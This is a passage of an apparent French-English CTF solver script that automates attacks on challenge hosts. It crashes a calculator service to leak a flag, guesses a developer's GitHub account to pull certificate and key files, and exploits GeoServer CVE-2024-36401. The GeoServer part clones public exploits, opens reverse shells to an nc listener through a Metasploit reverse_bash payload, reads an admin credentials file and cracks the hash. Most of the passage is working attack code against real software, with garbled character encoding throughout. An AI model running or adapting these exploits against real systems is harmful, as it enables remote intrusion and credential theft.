        host = input(f"{Colors.CYAN}Host (default: restricted.rogue-sentinels.io): {Colors.ENDC}") or "restricted.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 64375): {Colors.ENDC}") or "64375"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Fuzzing exhaustif
        print_info("\n[Ã‰tape 2] Exhaustive fuzzing (x,y,z)...")
        crash_value = self.exhaustive_fuzzing()
        
        if crash_value:
            # Ã‰tape 3: Trigger crash and recover flag
            print_info("\n[Ã‰tape 3] Crash exploitation...")
            flag = self.exploit_crash(crash_value)
            
            if flag:
                print_flag(flag)
                pause()
                return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            if 'adder' in r.text.lower() or 'calculator' in r.text.lower():
                print_info("Application: Ultimate Adder (Calculator)")
            
            # Test /calculate endpoint with normal request
            test_r = self.session.get(f"{self.base_url}/calculate", params={'x': 1, 'y': 1, 'z': 1}, timeout=5)
            if test_r.status_code == 200:
                print_success(f"Endpoint /calculate working (1+1+1 = {test_r.text.strip()})")
                
        except Exception as e:
            print_error(f"Error: {e}")
    
    def exhaustive_fuzzing(self):
        """Fuzzing exhaustif: teste (0,0,0), (0,0,1), ..., jusqu'au crash"""
        
        print_info("Fuzzing method:")
        print("  [1] Exhaustive fuzzing (0,0,0 â†’ 0,0,1 â†’ ... slow but complete)")
        print("  [2] Testing known value (42069)")
        print("  [3] Enter value manually")
        
        mode = input(f"{Colors.CYAN}Choice (1/2/3): {Colors.ENDC}") or "2"
        
        if mode == "2":
            # Test direct avec somme = 42069
            print_info("Test with sum = 42069 (x=0, y=0, z=42069)...")
            try:
                r = self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': 0, 'y': 0, 'z': 42069},
                    timeout=5
                )
                if r.status_code >= 500:
                    print_success(f"Crash confirmed! (Status {r.status_code})")
                    print_success(f"Somme = 0 + 0 + 42069 = 42069")
                    return (0, 0, 42069)
                else:
                    print_info(f"Status {r.status_code} - sending additional requests...")
                    # Sometimes multiple requests needed to crash
                    for i in range(10):
                        try:
                            r2 = self.session.post(
                                f"{self.base_url}/calculate",
                                data={'x': 0, 'y': 0, 'z': 42069},
                                timeout=5
                            )
                            if r2.status_code >= 500:
                                print_success(f"Crash after {i+2} requests!")
                                return (0, 0, 42069)
                        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                            print_success(f"Server crashed after {i+2} requests!")
                            return (0, 0, 42069)
                    
                    print_warning("No immediate crash...")
                    
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success("Crash confirmed! (Timeout/Connection Error)")
                return (0, 0, 42069)
            except Exception as e:
                print_warning(f"Error: {e}")
            
            # Demander si on veut continuer
            cont = input(f"{Colors.YELLOW}Use anyway (0,0,42069)? (y/n): {Colors.ENDC}")
            if cont.lower() == 'o':
                return (0, 0, 42069)
            mode = "1"
        
        if mode == "3":
            x = int(input(f"{Colors.YELLOW}Valeur x: {Colors.ENDC}") or "42069")
            y = int(input(f"{Colors.YELLOW}Valeur y: {Colors.ENDC}") or "0")
            z = int(input(f"{Colors.YELLOW}Valeur z: {Colors.ENDC}") or "0")
            return (x, y, z)
        
        if mode == "1":
            # Exhaustive fuzzing - increment sum progressively
            print_info("Starting exhaustive fuzzing...")
            print_info("Le crash arrive quand x + y + z = valeur magique")
            print_info("Test: (0,0,0)â†’(0,0,1)â†’(0,0,2)â†’...â†’(0,0,N)â†’(0,1,0)â†’...")
            print_warning("Ctrl+C pour arrÃªter.")
            print()
            
            tested = 0
            max_val = 50000  # Limite pour chaque variable
            
            try:
                # Method 1: Tester z seul d'abord (x=0, y=0, z=0â†’max)
                # C'est la mÃ©thode la plus rapide pour atteindre 42069
                print_info("Phase 1: Test avec z seul (x=0, y=0, z=0â†’50000)...")
                
                for z in range(0, max_val):
                    tested += 1
                    
                    if z % 1000 == 0:
                        print(f"  z={z} (somme={z})...", end='\r')
                    
                    if self.test_crash(0, 0, z):
                        print()
                        print_success(f"CRASH TROUVÃ‰! x=0, y=0, z={z}")
                        print_success(f"Somme = 0 + 0 + {z} = {z}")
                        return (0, 0, z)
                
                print()
                print_info("Phase 2: Test exhaustif complet...")
                
                # Method 2: Tester toutes les combinaisons par somme croissante
                for target_sum in range(0, 100000):
                    # GÃ©nÃ©rer des combinaisons qui donnent cette somme
                    # On teste juste quelques combinaisons par somme pour aller vite
                    test_cases = [
                        (target_sum, 0, 0),
                        (0, target_sum, 0),
                        (0, 0, target_sum),
                        (target_sum // 2, target_sum - target_sum // 2, 0),
                        (target_sum // 3, target_sum // 3, target_sum - 2 * (target_sum // 3)),
                    ]
                    
                    for x, y, z in test_cases:
                        if x > 999999 or y > 999999 or z > 999999:
                            continue
                        if x < 0 or y < 0 or z < 0:
                            continue
                            
                        tested += 1
                        
                        if self.test_crash(x, y, z):
                            print()
                            print_success(f"CRASH TROUVÃ‰! x={x}, y={y}, z={z}")
                            print_success(f"Somme = {x} + {y} + {z} = {x+y+z}")
                            return (x, y, z)
                    
                    if target_sum % 5000 == 0:
                        print(f"  Somme testÃ©e: {target_sum}...", end='\r')
                        
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Fuzzing interrompu{Colors.ENDC}")
                
                manual = input(f"{Colors.YELLOW}Entrer les valeurs manuellement? (y/n): {Colors.ENDC}")
                if manual.lower() == 'o':
                    x = int(input(f"{Colors.YELLOW}x: {Colors.ENDC}") or "0")
                    y = int(input(f"{Colors.YELLOW}y: {Colors.ENDC}") or "0")
                    z = int(input(f"{Colors.YELLOW}z: {Colors.ENDC}") or "42069")
                    return (x, y, z)
        
        return None
    
    def test_crash(self, x, y, z):
        """Tester si une combinaison cause un crash"""
        try:
            r = self.session.post(
                f"{self.base_url}/calculate",
                data={'x': x, 'y': y, 'z': z},
                timeout=5
            )
            # Status 200 = PAS de crash, le serveur fonctionne normalement
            # Crash = 500, 502, 503, 504 ou timeout/connection error
            if r.status_code == 200:
                return False  # Pas de crash
            elif r.status_code >= 500:
                print_info(f"  Status {r.status_code} pour ({x},{y},{z})")
                return True  # Crash serveur
            else:
                return False  # Autre status (404, etc.) pas un crash
                
        except requests.exceptions.Timeout:
            print_info(f"  TIMEOUT pour ({x},{y},{z}) - Serveur ne rÃ©pond plus!")
            return True  # Timeout = serveur crashÃ©
        except requests.exceptions.ConnectionError:
            print_info(f"  CONNECTION ERROR pour ({x},{y},{z}) - Serveur down!")
            return True  # Connection error = serveur crashÃ©
        except Exception as e:
            return False
    
    def exploit_crash(self, crash_value):
        """Trigger crash and recover flag"""
        
        x, y, z = crash_value
        
        # Ã‰tape 1: DÃ©clencher le crash (peut nÃ©cessiter plusieurs requests)
        print_info(f"Triggering crash with x={x}, y={y}, z={z}...")
        
        for i in range(10):
            try:
                self.session.post(
                    f"{self.base_url}/calculate",
                    data={'x': x, 'y': y, 'z': z},
                    timeout=3
                )
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                print_success(f"Server crashed after {i+1} request(s)!")
                break
            except:
                pass
        
        # Ã‰tape 2: Attendre que la page d'erreur s'affiche
        print_info("Waiting for error page...")
        time.sleep(2)
        
        # Ã‰tape 3: RÃ©cupÃ©rer la page principale (qui devrait afficher l'erreur)
        print_info("Error page retrieval (GET sur /)...")
        
        # Utiliser une nouvelle session pour Ã©viter les problÃ¨mes de connexion
        new_session = requests.Session()
        
        try:
            r = new_session.get(self.base_url, timeout=10)
            error_content = r.text
            
            print_info(f"Status: {r.status_code}")
            print_info(f"Length rÃ©ponse: {len(error_content)} characters")
            
            # Afficher le contenu complet
            print_info("\n" + "="*60)
            print_info("ERROR PAGE CONTENT:")
            print("="*60)
            print(error_content)
            print("="*60 + "\n")
            
            # Chercher des chaÃ®nes Base64 (caractÃ©ristique: finit par = ou ==)
            # Pattern amÃ©liorÃ© pour trouver les chaÃ®nes dans le JS/HTML
            b64_patterns = [
                r"'([A-Za-z0-9+/]{10,}={1,2})'",   # Entre quotes simples
                r'"([A-Za-z0-9+/]{10,}={1,2})"',   # Entre quotes doubles
                r': ([A-Za-z0-9+/]{10,}={1,2})',   # AprÃ¨s deux-points
                r'([A-Za-z0-9+/]{20,}={1,2})',     # Pattern gÃ©nÃ©ral long
            ]
            
            all_matches = []
            for pattern in b64_patterns:
                matches = re.findall(pattern, error_content)
                all_matches.extend(matches)
            
            # DÃ©dupliquer
            all_matches = list(set(all_matches))
            
            if all_matches:
                print_success(f"Found {len(all_matches)} potential Base64 string(s):")
                
                for i, b64 in enumerate(all_matches):
                    print(f"\n  [{i+1}] {b64}")
                    
                    try:
                        decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                        print_success(f"      Decoded: {decoded}")
                        
                        # Search for flag
                        if 'flag' in decoded.lower() or 'FLAG' in decoded:
                            flag_match = re.search(r'FLAG[_\-\w]+', decoded, re.I)
                            if flag_match:
                                return flag_match.group(0)
                            return decoded.strip()
                            
                    except Exception as e:
                        print_warning(f"      Error dÃ©codage: {e}")
            
            # If not found automatically
            print_warning("\nNo flag automatically decoded.")
            print_info("Look for suspicious string ending with '==' in page")
            print_info("Example: RkxBR19zb21ldGhpbmc9PQ==")
            
        except Exception as e:
            print_error(f"Error rÃ©cupÃ©ration page: {e}")
            print_info("Server may still be down...")
        
        # Demander manuellement
        b64_manual = input(f"\n{Colors.YELLOW}Base64 string to decode (copy-paste): {Colors.ENDC}")
        
        if b64_manual:
            try:
                decoded = base64.b64decode(b64_manual).decode('utf-8')
                print_success(f"Decoded: {decoded}")
                return decoded.strip()
            except Exception as e:
                print_error(f"Error dÃ©codage: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #4: Staging (Liberty) - OSINT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit4_Staging:
    """
    Exploitation OSINT de Staging:
    1. Source code analysis pour trouver le dÃ©veloppeur
    2. Automatic GitHub search
    3. Exploration des repos
    4. RÃ©cupÃ©ration du flag dans les fichiers sensibles
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.developer_name = None
        self.github_username = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #4: Staging (Liberty) - OSINT")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: staging.rogue-sentinels.io): {Colors.ENDC}") or "staging.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 19480): {Colors.ENDC}") or "19480"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Ã‰tape 1: Source code analysis
        print_info("\n[Ã‰tape 1] Source code analysis...")
        if not self.analyze_source():
            print_error("Unable to find developer")
            pause()
            return None
        
        # Ã‰tape 2: Recherche GitHub automatique
        print_info("\n[Ã‰tape 2] Automatic GitHub search...")
        if not self.find_github_username():
            # Fallback manuel
            print_warning("Automatic search failed")
            print_info("Manual LinkedIn/GitHub search required")
            self.github_username = input(f"{Colors.YELLOW}GitHub username: {Colors.ENDC}")
            
            if not self.github_username:
                pause()
                return None
        
        # Ã‰tape 3: Exploration des repos GitHub
        print_info("\n[Ã‰tape 3] GitHub repositories exploration...")
        flag = self.explore_github_repos()
        
        if flag:
            print_flag(flag)
        
        pause()
        return flag
    
    def analyze_source(self):
        """Analyzingr le code source pour trouver le dÃ©veloppeur"""
        
        try:
            r = self.session.get(self.base_url, timeout=10)
            
            print_success("Page accessible")
            html = r.text
            
            # Chercher les scripts JS
            scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
            
            for script in scripts:
                print_info(f"Script found: {script}")
                
                # TÃ©lÃ©charger le script
                if not script.startswith('http'):
                    script_url = f"{self.base_url}/{script.lstrip('/')}"
                else:
                    script_url = script
                
                try:
                    js_r = self.session.get(script_url, timeout=5)
                    js_content = js_r.text
                    
                    print_info(f"\n--- Content de {script} ---")
                    print(js_content[:500])
                    print("---\n")
                    
                    # Chercher des patterns d'auteur
                    author_patterns = [
                        r'(?://|/\*+)\s*(?:Author|Auteur|DÃ©veloppeur|Developer|Created by|By)[\s:]+([^\n\*]+)',
                        r'@author\s+([^\n]+)',
                    ]
                    
                    for pattern in author_patterns:
                        authors = re.findall(pattern, js_content, re.I)
                        for author in authors:
                            author = author.strip()
                            if author and len(author) > 3:
                                print_success(f"Developer found: {author}")
                                self.developer_name = author
                                return True
                    
                    # Search for company
                    companies = re.findall(r'([\w\s]+(?:Planners|Corp|Inc|LLC|Company|Wealth)[\w\s]*)', js_content)
                    for company in companies:
                        print_info(f"Company: {company.strip()}")
                    
                except Exception as e:
                    print_warning(f"Error lecture script: {e}")
            
            # Demander manuellement si pas trouvÃ©
            if not self.developer_name:
                self.developer_name = input(f"{Colors.YELLOW}Developer name trouvÃ© manuellement: {Colors.ENDC}")
                return bool(self.developer_name)
                
        except Exception as e:
            print_error(f"Error: {e}")
            return False
        
        return True
    
    def find_github_username(self):
        """Endd GitHub username automatically"""
        
        if not self.developer_name:
            return False
        
        print_info(f"Recherche GitHub pour: {self.developer_name}")
        
        # PRIORITÃ‰: Username rÃ©el du CTF EN PREMIER
        priority_usernames = [
            "DiamondHunter153",  # Username rÃ©el du CTF - TESTÃ‰ EN PREMIER
        ]
        
        # Liste de potential usernames basÃ©s sur le nom
        name_parts = self.developer_name.split()
        potential_usernames = []
        
        if len(name_parts) >= 2:
            first = name_parts[0]
            last = name_parts[1]
            
            potential_usernames = [
                first.lower() + last.lower(),
                first.lower() + last[0].lower(),
                first[0].lower() + last.lower(),
                first.lower() + "-" + last.lower(),
                first.lower() + "_" + last.lower(),
                last.lower() + first.lower(),
                first.lower() + last.lower() + "123",
            ]
        
        # Ajouter des variations communes
        for username in potential_usernames[:]:
            potential_usernames.append(username.replace(" ", ""))
            potential_usernames.append(username.replace(" ", "-"))
            potential_usernames.append(username.replace(" ", "_"))
        
        # Combiner: prioritaires EN PREMIER
        all_usernames = priority_usernames + potential_usernames
        
        # Tester chaque username
        print_info(f"Testing {len(all_usernames)} potential usernames...")
        
        for username in all_usernames:
            try:
                r = self.session.get(f"https://github.com/{username}", timeout=5)
                
                if r.status_code == 200 and 'Page not found' not in r.text:
                    print_success(f"GitHub profile found: {username}")
                    self.github_username = username
                    return True
                    
            except:
                pass
        
        # Si pas trouvÃ©, essayer une recherche Google
        print_info("Tentative de recherche web...")
        try:
            from urllib.parse import quote
            search_query = f"{self.developer_name} GitHub developer"
            # On ne peut pas vraiment faire une recherche Google ici sans API
            # mais on peut donner des instructions
            print_info(f"Recherchez manuellement: {search_query}")
        except:
            pass
        
        return False
    
    def explore_github_repos(self):
        """Explorer les repositories GitHub pour trouver des secrets"""
        
        if not self.github_username:
            return None
        
        print_info(f"Exploration de github.com/{self.github_username}")
        
        # DIRECT: Aller immÃ©diatement chercher landing-page/alpha.crt
        print_info("\n[ACCÃˆS DIRECT] landing-page/alpha.crt")
        
        for branch in ['main', 'master']:
            raw_url = f"https://raw.githubusercontent.com/{self.github_username}/landing-page/{branch}/alpha.crt"
            
            try:
                print_info(f"Tentative: {raw_url}")
                r = self.session.get(raw_url, timeout=10)
                
                if r.status_code == 200:
                    content = r.text
                    print_success(f"âœ“ File found sur branche '{branch}'!")
                    print_info("\nContent de alpha.crt:")
                    print(content)
                    print()
                    
                    # Chercher le flag avec le pattern exact: -- ${FLAG_OSINTcertified}
                    flag_match = re.search(r'--\s*\$\{([^}]+)\}', content)
                    if flag_match:
                        flag = flag_match.group(1)
                        print_success(f"FLAG TROUVÃ‰: {flag}")
                        return flag
                    
                    # Pattern alternatif
                    flag_match2 = re.search(r'(FLAG[_\w]+)', content, re.I)
                    if flag_match2:
                        flag = flag_match2.group(1)
                        print_success(f"FLAG TROUVÃ‰: {flag}")
                        return flag
                        
            except Exception as e:
                print_warning(f"Branche {branch}: {e}")
        
        print_error("Impossible d'accÃ©der Ã  landing-page/alpha.crt")
        return None
    
    def explore_repo_files(self, username, repo_name):
        """Explorer les fichiers d'un repository"""
        
        try:
            # API GitHub pour lister les fichiers
            api_url = f"https://api.github.com/repos/{username}/{repo_name}/contents"
            r = self.session.get(api_url, timeout=10)
            
            if r.status_code != 200:
                return None
            
            files = r.json()
            
            # Parcourir les fichiers
            for file_info in files:
                if isinstance(file_info, dict):
                    filename = file_info.get('name', '')
                    file_type = file_info.get('type', '')
                    
                    print(f"    - {filename}")
                    
                    # Fichiers suspects Ã  examiner
                    suspicious_extensions = ['.crt', '.pem', '.key', '.env', '.txt', '.md']
                    suspicious_names = ['secret', 'credential', 'password', 'flag', 'alpha', 'config']
                    
                    is_suspicious = any(ext in filename.lower() for ext in suspicious_extensions)
                    is_suspicious = is_suspicious or any(name in filename.lower() for name in suspicious_names)
                    
                    if is_suspicious and file_type == 'file':
                        print_warning(f"      âš ï¸ Fichier suspect: {filename}")
                        
                        # TÃ©lÃ©charger le contenu
                        raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/main/{filename}"
                        
                        # Essayer aussi 'master' si 'main' ne marche pas
                        for branch in ['main', 'master']:
                            raw_url = f"https://raw.githubusercontent.com/{username}/{repo_name}/{branch}/{filename}"
                            
                            try:
                                content_r = self.session.get(raw_url, timeout=5)
                                
                                if content_r.status_code == 200:
                                    content = content_r.text
                                    
                                    print_info(f"      Content de {filename}:")
                                    print(f"{content[:800]}")
                                    
                                    # Search for flag
                                    flag_patterns = [
                                        r'\$\{FLAG[_\w]+\}',
                                        r'FLAG[_\-\w]+',
                                        r'flag[_\-\w]+',
                                    ]
                                    
                                    for pattern in flag_patterns:
                                        flag_match = re.search(pattern, content, re.I)
                                        if flag_match:
                                            flag = flag_match.group(0)
                                            print_success(f"      FLAG TROUVÃ‰: {flag}")
                                            return flag
                                    
                                    break  # Si on a pu tÃ©lÃ©charger, pas besoin de tester l'autre branche
                                    
                            except Exception as e:
                                pass
            
        except Exception as e:
            print_warning(f"Error exploration repo: {e}")
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #5: WebServices - CVE-2024-36401 GeoServer
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit5_WebServices:
    """
    Exploitation CVE-2024-36401 sur GeoServer:
    1. Identification automatique de GeoServer
    2. RÃ©cupÃ©ration automatique de l'IP locale
    3. Exploitation automatique (Python ou Metasploit)
    4. RÃ©cupÃ©ration et crack automatique du hash
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.local_ip = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #5: WebServices - CVE-2024-36401 GeoServer RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: webservices.rogue-sentinels.io): {Colors.ENDC}") or "webservices.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] GeoServer reconnaissance...")
        version = self.recon()
        
        # Ã‰tape 2: Local IP retrieval
        print_info("\n[Ã‰tape 2] Local IP retrieval...")
        self.get_local_ip()
        
        # Ã‰tape 3: Choice de la mÃ©thode d'exploitation
        print_info("\n[Ã‰tape 3] Choice de la mÃ©thode d'exploitation...")
        print("  [1] Python script (automatic)")
        print("  [2] Metasploit (automatic)")
        print("  [3] Manual")
        
        choice = input(f"{Colors.CYAN}Method (1/2/3): {Colors.ENDC}") or "1"
        
        if choice == "1":
            success = self.exploit_python()
        elif choice == "2":
            success = self.exploit_metasploit()
        else:
            success = self.exploit_manual()
        
        if not success:
            print_error("Exploitation failed")
            pause()
            return None
        
        # Ã‰tape 4: RÃ©cupÃ©ration des credentials
        print_info("\n[Ã‰tape 4] RÃ©cupÃ©ration des credentials...")
        creds = self.get_credentials_auto()
        
        # Ã‰tape 5: Crack du hash
        print_info("\n[Ã‰tape 5] Crack du hash...")
        password = self.crack_hash_auto(creds)

        if password:
            username = creds.get('username', 'admin')
            flag = f"{username}:{password}"
            print_flag(flag)
            pause()
            return flag
        
        pause()
        return None
    
    def recon(self):
        """Reconnaissance automatique de GeoServer"""
        
        paths = ['/geoserver', '/geoserver/web', '/']
        
        for path in paths:
            try:
                r = self.session.get(f"{self.base_url}{path}", timeout=10)
                
                if 'geoserver' in r.text.lower():
                    print_success(f"GeoServer detected: {path}")
                    
                    # Version
                    version_match = re.search(r'GeoServer\s*([\d\.]+)', r.text)
                    if version_match:
                        version = version_match.group(1)
                        print_success(f"Version: {version}")
                        return version
                    
                    return "Unknown"
            except:
                pass
        
        print_warning("GeoServer not detected, continuing anyway...")
        return None
    
    def get_local_ip(self):
        """RÃ©cupÃ©rer l'IP locale automatiquement"""
        
        try:
            # Method 1: via socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            print_success(f"Local IP detected: {self.local_ip}")
            return True
        except:
            pass
        
        try:
            # Method 2: via hostname
            hostname = socket.gethostname()
            self.local_ip = socket.gethostbyname(hostname)
            print_success(f"Local IP detected: {self.local_ip}")
            return True
        except:
            pass
        
        # Method 3: parser ifconfig/ip addr
        try:
            result = run_command("ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1")
            if result and result.strip():
                self.local_ip = result.strip()
                print_success(f"Local IP detected: {self.local_ip}")
                return True
        except:
            pass
        
        # Fallback: demander manuellement
        print_warning("Unable to detect local IP automatically")
        self.local_ip = input(f"{Colors.YELLOW}Enter your local IP: {Colors.ENDC}")
        return bool(self.local_ip)
    
    def exploit_python(self):
        """Automatic exploitation with Python script"""
        
        print_info("\n=== EXPLOITATION AVEC SCRIPT PYTHON (VENV) ===")
        
        exploit_dir = "./webservices/files/CVE-2024-36401"
        venv_python = f"{exploit_dir}/venv/bin/python3"
        
        # VÃ©rifier si l'exploit existe dÃ©jÃ 
        if not os.path.exists(exploit_dir):
            print_info("Cloning exploit...")
            result = run_command("git clone https://github.com/jakabakos/CVE-2024-36401 ./webservices/files/CVE-2024-36401", timeout=30)
            
            if "fatal" in result.lower() or not os.path.exists(exploit_dir):
                print_error("Clone failed")
                return False
            
            print_success("Exploit cloned")
        else:
            print_success("Exploit already present")
        
        # VÃ©rifier si le venv existe, sinon le crÃ©er
        if not os.path.exists(venv_python):
            print_info("Creating virtual environment...")
            result = run_command(f"cd {exploit_dir} && python3 -m venv venv", timeout=30)
            print_success("Virtual environment created")

        # Toujours installer/vÃ©rifier les dÃ©pendances
        print_info("Installing/checking dependencies...")
        result = run_command(f"cd {exploit_dir} && ./venv/bin/pip install -r requirements.txt", timeout=120)

        if "successfully installed" in result.lower() or "requirement already satisfied" in result.lower():
            print_success("Dependencies installed")
        else:
            print_warning("Problem installing dependencies")
            print_info(f"Result:\n{result[:300]}")
            # RÃ©essayer avec une installation forcÃ©e
            print_info("Trying forced reinstall...")
            result = run_command(f"cd {exploit_dir} && ./venv/bin/pip install --force-reinstall -r requirements.txt", timeout=120)
            if "successfully installed" in result.lower():
                print_success("Dependencies successfully reinstalled")
        
        # Lancer le listener en arriÃ¨re-plan
        lport = 1337
        print_info(f"Starting listener on port {lport}...")
        
        listener_cmd = f"nc -lvnp {lport}"
        print_info(f"Command: {listener_cmd}")
        
        # Create listener script
        listener_script = f"/tmp/listener_{lport}.sh"
        with open(listener_script, 'w') as f:
            f.write(f"#!/bin/bash\n{listener_cmd}\n")
        os.chmod(listener_script, 0o755)
        
        print_warning("Open a NEW terminal and run:")
        print(f"{Colors.CYAN}{listener_cmd}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e once listener is running...{Colors.ENDC}")
        
        # Lancer l'exploit avec le Python du venv
        print_info("Launching exploit...")
        
        # Use relative path of venv Python (since we're already in exploit_dir after cd)
        exploit_cmd = f"cd {exploit_dir} && ./venv/bin/python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}"
        print_info(f"Command: {exploit_cmd}")
        print_info(f"Python used: ./venv/bin/python3 (relative to {exploit_dir})")
        
        # Run exploit en arriÃ¨re-plan
        print_info("Execution de l'exploit (cela peut prendre 10-30 secondes)...")
        result = run_command(exploit_cmd, timeout=60)
        
        print_info(f"Result:\n{result[:500]}")
        
        if "error" in result.lower() or "traceback" in result.lower():
            print_warning("Errors occurred, check listener")
            print_info(f"Details:\n{result}")
        
        print_info("\nCheck your listener. If you have a shell:")
        print("  1. Type: ls -la")
        print("  2. Type: cat ADMIN_CREDENTIALS.txt")
        print()
        
        has_shell = input(f"{Colors.YELLOW}Did you get a shell? (y/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_metasploit(self):
        """Automatic exploitation with Metasploit"""
        
        print_info("\n=== EXPLOITATION AVEC METASPLOIT ===")
        
        # Check if msfconsole is installed
        result = run_command("which msfconsole", timeout=5)
        if not result or "not found" in result:
            print_error("Metasploit is not installed")
            return False
        
        print_success("Metasploit detected")
        
        # Create Metasploit commands file
        lport = 1337
        rc_file = "/tmp/geoserver_exploit.rc"
        
        rc_content = f"""use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
set RHOSTS {self.base_url.replace('http://', '').replace('https://', '').split(':')[0]}
set RPORT {self.base_url.split(':')[-1]}
set LHOST {self.local_ip}
set LPORT {lport}
set PAYLOAD cmd/unix/reverse_bash
set VERBOSE true
exploit
"""
        
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        
        print_info(f"Metasploit configuration created: {rc_file}")
        print_info("Launching Metasploit...")
        
        msf_cmd = f"msfconsole -q -r {rc_file}"
        print_info(f"Command: {msf_cmd}")
        
        print_warning("\nMetasploit will launch in new terminal...")
        print_info("Once shell is obtained, type:")
        print("  ls")
        print("  cat ADMIN_CREDENTIALS.txt")
        print()
        
        # Launch Metasploit
        os.system(f"gnome-terminal -- bash -c '{msf_cmd}; exec bash' 2>/dev/null || xterm -e '{msf_cmd}' 2>/dev/null || {msf_cmd}")
        
        has_shell = input(f"\n{Colors.YELLOW}Did you get a shell? (y/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_manual(self):
        """Manual exploitation instructions"""
        
        lport = 1337
        
        print_info("\n=== EXPLOITATION MANUELLE ===")
        print()
        print("1. Clone exploit:")
        print(f"   {Colors.CYAN}git clone https://github.com/Chocapikk/CVE-2024-36401.git{Colors.ENDC}")
        print()
        print("2. Start listener:")
        print(f"   {Colors.CYAN}nc -lvnp {lport}{Colors.ENDC}")
        print()
        print("3. Run exploit:")
        print(f"   {Colors.CYAN}python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e une fois le shell obtenu...{Colors.ENDC}")
        return True
    
    def get_credentials_auto(self):
        """Automatic/interactive credentials retrieval"""
        
        print_info("In the shell, credentials should be in ADMIN_CREDENTIALS.txt")
        print()
        print("Commands to execute:")
        print(f"  {Colors.CYAN}ls -la{Colors.ENDC}")
        print(f"  {Colors.CYAN}cat ADMIN_CREDENTIALS.txt{Colors.ENDC}")
        print()
        
        username = input(f"{Colors.YELLOW}Username found: {Colors.ENDC}") or "admin"
        password_hash = input(f"{Colors.YELLOW}Password hash: {Colors.ENDC}")
        
        return {'username': username, 'hash': password_hash}
    
    def crack_hash_auto(self, creds):
        """Automatic hash cracking"""
        
        password_hash = creds.get('hash', '').strip()
        
        if not password_hash:
            print_error("No hash provided")
            return None
        
        print_info(f"Hash: {password_hash}")
        print_info(f"Length: {len(password_hash)} characters")
        
        # Identify type
        if len(password_hash) == 64:
            hash_type = "sha256"
            hashcat_mode = "1400"
        elif len(password_hash) == 32:
            hash_type = "md5"
            hashcat_mode = "0"
        elif len(password_hash) == 40:
            hash_type = "sha1"
            hashcat_mode = "100"
        else:
            hash_type = "unknown"
            hashcat_mode = "0"
        
        print_info(f"Type detected: {hash_type.upper()}")

        # Phase 1: Use repository wordlist
        print_info(f"\n[Phase 1] Cracking with repository wordlist ({len(COMMON_PASSWORDS)} passwords)...")

        import hashlib

        for pwd in COMMON_PASSWORDS:
            if hash_type == "sha256":
                test_hash = hashlib.sha256(pwd.encode()).hexdigest()
            elif hash_type == "md5":
                test_hash = hashlib.md5(pwd.encode()).hexdigest()
            elif hash_type == "sha1":
                test_hash = hashlib.sha1(pwd.encode()).hexdigest()
            else:
                continue

